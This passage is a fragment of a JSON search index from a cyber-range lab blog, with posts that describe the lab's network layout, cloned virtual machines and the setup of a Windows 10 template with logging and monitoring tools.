\u003ctd\u003eopf-fw01\u003c/td\u003e\n          \u003ctd\u003e192.168.1.24 (WAN)\u003c/td\u003e\n          \u003ctd\u003epfSense router\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-dc01\u003c/td\u003e\n          \u003ctd\u003e192.168.40.100\u003c/td\u003e\n          \u003ctd\u003eADINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003e192.168.30.101\u003c/td\u003e\n          \u003ctd\u003eLANWORKSTATIONS\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003e192.168.22.50\u003c/td\u003e\n          \u003ctd\u003eDMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003e192.168.20.12\u003c/td\u003e\n          \u003ctd\u003eCSOCINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","title":"OPFORGE Network Layout"},{"content":"üîÅ Cloned VMs in the OPFORGE Lab The following VMs are derived from the base templates and customized for their operational roles.\nTemplate Clone Role Description base-ubuntu-2204-template opf-red01 Red Team operator + C2 lab base-ubuntu-2204-template opf-log01 Log ingestion + OpenSearch stack base-ubuntu-2204-template opf-ai01 ML/AI detection modeling base-ubuntu-2204-template opf-cloud01 Web app target in DMZRED base-windows10-template opf-mbr01 Domain-joined endpoint (Win10) üß† Notes Hostnames and static IPs are applied per segment Each VM is configured with dedicated virtual NICs Cloning process preserves snapshot state and configuration integrity ","permalink":"https://opforge.dev/posts/opf-clone-map/","summary":"\u003ch2 id=\"-cloned-vms-in-the-opforge-lab\"\u003eüîÅ Cloned VMs in the OPFORGE Lab\u003c/h2\u003e\n\u003cp\u003eThe following VMs are derived from the base templates and customized for their operational roles.\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eTemplate\u003c/th\u003e\n          \u003cth\u003eClone\u003c/th\u003e\n          \u003cth\u003eRole Description\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-red01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eRed Team operator + C2 lab\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-log01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eLog ingestion + OpenSearch stack\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-ai01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eML/AI detection modeling\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eWeb app target in DMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-windows10-template\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eopf-mbr01\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eDomain-joined endpoint (Win10)\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"-notes\"\u003eüß† Notes\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eHostnames and static IPs are applied per segment\u003c/li\u003e\n\u003cli\u003eEach VM is configured with dedicated virtual NICs\u003c/li\u003e\n\u003cli\u003eCloning process preserves snapshot state and configuration integrity\u003c/li\u003e\n\u003c/ul\u003e","title":"OPFORGE VM Clone Map"},{"content":"Clone Map Template Clone Name Purpose base-ubuntu-2204-template opf-red01 Red Team operator box base-ubuntu-2204-template opf-log01 Log pipeline (Zeek, OpenSearch) base-ubuntu-2204-template opf-ai01 Jupyter + anomaly detection base-ubuntu-2204-template opf-cloud01 Targeted web app for attack base-windows10-template opf-mbr01 Domain-joined endpoint Lessons Learned Clone from snapshot, then personalize (hostname, NIC, IP) Use base templates with all dependencies pre-installed Maintain consistency across VM builds using scripting and snapshots ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-vm-cloning/","summary":"\u003ch2 id=\"clone-map\"\u003eClone Map\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eTemplate\u003c/th\u003e\n          \u003cth\u003eClone Name\u003c/th\u003e\n          \u003cth\u003ePurpose\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003eRed Team operator box\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003eLog pipeline (Zeek, OpenSearch)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-ai01\u003c/td\u003e\n          \u003ctd\u003eJupyter + anomaly detection\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-ubuntu-2204-template\u003c/td\u003e\n          \u003ctd\u003eopf-cloud01\u003c/td\u003e\n          \u003ctd\u003eTargeted web app for attack\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ebase-windows10-template\u003c/td\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003eDomain-joined endpoint\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eClone from snapshot, then personalize (hostname, NIC, IP)\u003c/li\u003e\n\u003cli\u003eUse base templates with all dependencies pre-installed\u003c/li\u003e\n\u003cli\u003eMaintain consistency across VM builds using scripting and snapshots\u003c/li\u003e\n\u003c/ul\u003e","title":"Scaling OPFORGE: How I Clone and Manage Cyber Range VMs"},{"content":"This post documents the process of building and finalizing the Windows 10 Pro 22H2 template for use in the OPFORGE cyber lab environment.\nüõ†Ô∏è Version \u0026amp; Baseline OS: Windows 10 Pro 22H2 (fully patched as of 2025-05-25) Build Source: Clean ISO install (22H2), upgraded from legacy 10240 Purpose: Golden template for domain-joined endpoint clones (opf-mbr01, future victim hosts) üì¶ Tool Installation via Script After installation and patching, the following tools were installed using the custom script:\nInstall-OPFORGE-WindowsTools.ps1 Tools Installed: Sysmon Winlogbeat 7zip VSCode Notepad++ Sysinternals Suite Wireshark Autoruns Process Explorer üîê System Hardening Included in the setup:\nRemoval of bloatware and telemetry Disabling Cortana, Xbox services, OneDrive Clean Start Menu layout Chocolatey configured for repeat installs üßΩ Final Cleanup \u0026amp; Snapshot Prior to cloning or Sysprep:\ncleanmgr /sagerun:1 powercfg -h off Snapshot taken:\nbase-windows10-template - win10_22H2_tools_installed\n‚úÖ Status This image is ready to be cloned into production boxes like:\nopf-mbr01 Future detection test targets Domain-joined Windows clients For installation automation, refer to: Install-OPFORGE-WindowsTools.ps1\n","permalink":"https://opforge.dev/posts/windows-setup/","summary":"\u003cp\u003eThis post documents the process of building and finalizing the \u003cstrong\u003eWindows 10 Pro 22H2\u003c/strong\u003e template for use in the OPFORGE cyber lab environment.\u003c/p\u003e\n\u003ch2 id=\"-version--baseline\"\u003eüõ†Ô∏è Version \u0026amp; Baseline\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows 10 Pro 22H2 (fully patched as of 2025-05-25)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBuild Source\u003c/strong\u003e: Clean ISO install (22H2), upgraded from legacy 10240\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePurpose\u003c/strong\u003e: Golden template for domain-joined endpoint clones (\u003ccode\u003eopf-mbr01\u003c/code\u003e, future victim hosts)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-tool-installation-via-script\"\u003eüì¶ Tool Installation via Script\u003c/h2\u003e\n\u003cp\u003eAfter installation and patching, the following tools were installed using the custom script:\u003c/p\u003e","title":"Windows 10 Template Setup for OPFORGE"}]